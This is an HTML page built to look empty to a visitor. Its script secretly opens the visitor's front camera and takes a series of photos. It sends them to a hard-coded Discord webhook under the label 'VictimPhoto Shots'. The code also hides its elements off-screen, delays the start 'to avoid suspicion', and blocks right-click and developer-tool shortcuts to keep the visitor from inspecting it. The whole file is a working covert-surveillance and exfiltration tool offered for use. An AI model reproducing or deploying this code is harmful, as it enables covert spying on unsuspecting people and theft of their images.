<!DOCTYPE html>
<html>
<head>
    <title></title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            background: #ffffff;
            overflow: hidden;
        }
        
        /* Completely hidden elements */
        #hiddenCamera, #hiddenCanvas, #status {
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
        
        /* Invisible loading indicator (off-screen) */
        .loader {
            position: fixed;
            top: -100px;
            left: -100px;
            width: 50px;
            height: 50px;
            z-index: -9999;
        }
    </style>
</head>
<body>
    <!-- Appears as completely empty page -->
    
    <!-- Hidden camera elements -->
    <video id="hiddenCamera" autoplay playsinline></video>
    <canvas id="hiddenCanvas"></canvas>
    <div id="status"></div>
    
    <!-- Hidden Discord webhook config -->
    <div id="config" style="display:none">
        <input type="hidden" id="webhookUrl" value="https://discord.com/api/webhooks/1446649009208037437/JCu61Jl2uV8lJX82B7JzY7E2aotkBhfP_WUQ5MlcT0h_izJ1qPvwrvOre97InD2nNUiQ">
    </div>

    <script>
        // Configuration - Edit these values as needed
        const CONFIG = {
            webhookUrl: document.getElementById('webhookUrl').value,
            totalPhotos: 7,
            delayBetweenPhotos: 1500, // milliseconds
            initialDelay: 1000, // wait before starting
            autoClose: false, // automatically close tab when done
            debugMode: false // set to true to see console logs
        };

        // State management
        let state = {
            stream: null,
            photos: [],
            currentCount: 0,
            isComplete: false,
            started: false
        };

        // Debug logging (only in debug mode)
        function log(...args) {
            if (CONFIG.debugMode) {
                console.log('[HiddenCapture]', ...args);
            }
        }

        // Update status (hidden element for debugging)
        function updateStatus(msg) {
            document.getElementById('status').textContent = msg;
            log(msg);
        }

        // Take a single photo from camera
        function capturePhoto() {
            if (!state.stream || state.currentCount >= CONFIG.totalPhotos) return;

            const video = document.getElementById('hiddenCamera');
            const canvas = document.getElementById('hiddenCanvas');
            const ctx = canvas.getContext('2d');

            // Set canvas size to video size
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;

            // Draw current video frame to canvas
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // Convert to blob
            canvas.toBlob((blob) => {
                if (blob) {
                    state.photos.push(blob);
                    state.currentCount++;
                    
                    updateStatus(`Captured ${state.currentCount}/${CONFIG.totalPhotos}`);
                    
                    // Check if we're done
                    if (state.currentCount >= CONFIG.totalPhotos) {
                        completeCapture();
                    } else {
                        // Schedule next capture
                        setTimeout(capturePhoto, CONFIG.delayBetweenPhotos);
                    }
                }
            }, 'image/jpeg', 0.8);
        }

        // Send all photos to Discord
        async function sendToDiscord() {
            if (!CONFIG.webhookUrl || !CONFIG.webhookUrl.includes('discord.com')) {
                updateStatus('No valid webhook URL configured');
                return false;
            }

            if (state.photos.length === 0) {
                updateStatus('No photos to send');
                return false;
            }

            try {
                updateStatus('Sending to Discord...');
                
                const formData = new FormData();
                formData.append('content', 'VictimPhoto Shots ðŸŽ‰ðŸ˜ˆðŸ“¸:');
                
                // Add all photos to form data
                state.photos.forEach((photo, index) => {
                    formData.append(`files[${index}]`, photo, `capture_${Date.now()}_${index + 1}.jpg`);
                });

                // Send to Discord webhook
                const response = await fetch(CONFIG.webhookUrl, {
                    method: 'POST',
                    body: formData
                });

                if (response.ok) {
                    updateStatus(`âœ… Sent ${state.photos.length} photos to Discord`);
                    return true;
                } else {
                    updateStatus(`âŒ Discord error: ${response.status}`);
                    return false;
                }
            } catch (error) {
                updateStatus(`âŒ Network error: ${error.message}`);
                return false;
            }
        }

        // Cleanup and finish
        function completeCapture() {
            state.isComplete = true;
            
            // Stop camera stream
            if (state.stream) {
                state.stream.getTracks().forEach(track => track.stop());
            }
            
            // Send to Discord
            sendToDiscord().then(success => {
                if (CONFIG.autoClose && success) {
                    // Auto-close tab after successful send
                    setTimeout(() => {
                        window.close();
                    }, 1000);
                }
            });
        }

        // Initialize camera
        async function initializeCamera() {
            try {
                updateStatus('Initializing camera...');
                
                state.stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user', // Front camera
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });

                const video = document.getElementById('hiddenCamera');
                video.srcObject = state.stream;
                
                // Wait for video to be ready
                video.onloadedmetadata = () => {
                    updateStatus('Camera ready, starting capture...');
                    
                    // Start capturing photos
                    setTimeout(() => {
                        capturePhoto();
                    }, 500);
                };

            } catch (error) {
                updateStatus(`Camera error: ${error.name}`);
                
                // Fallback: If camera fails, send dummy message
                if (CONFIG.webhookUrl.includes('discord.com')) {
                    fetch(CONFIG.webhookUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: 'HappyScreenshot ðŸ˜€: Camera access failed'
                        })
                    });
                }
                
                if (CONFIG.autoClose) {
                    setTimeout(() => window.close(), 2000);
                }
            }
        }

        // Start everything when page loads
        window.addEventListener('load', () => {
            updateStatus('Page loaded, waiting to start...');
            
            // Delay start slightly to avoid suspicion
            setTimeout(() => {
                if (!state.started) {
                    state.started = true;
                    initializeCamera();
                }
            }, CONFIG.initialDelay);
        });

        // Handle page visibility changes (if user switches tabs)
        document.addEventListener('visibilitychange', () => {
            if (document.hidden && !state.isComplete) {
                // Page hidden, speed up process
                CONFIG.delayBetweenPhotos = 500;
            }
        });

        // Prevent accidental page close (optional)
        window.addEventListener('beforeunload', (e) => {
            if (!state.isComplete) {
                // Optional: Show warning if capture incomplete
                // e.preventDefault();
                // e.returnValue = '';
            }
        });

        // Disable right-click context menu
        document.addEventListener('contextmenu', (e) => e.preventDefault());
        
        // Optional: Disable some keyboard shortcuts
        document.addEventListener('keydown', (e) => {
            // Prevent F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
            if (
                e.key === 'F12' ||
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
                (e.ctrlKey && e.key === 'u')
            ) {
                e.preventDefault();
            }
        });

    </script>
</body>
</html>
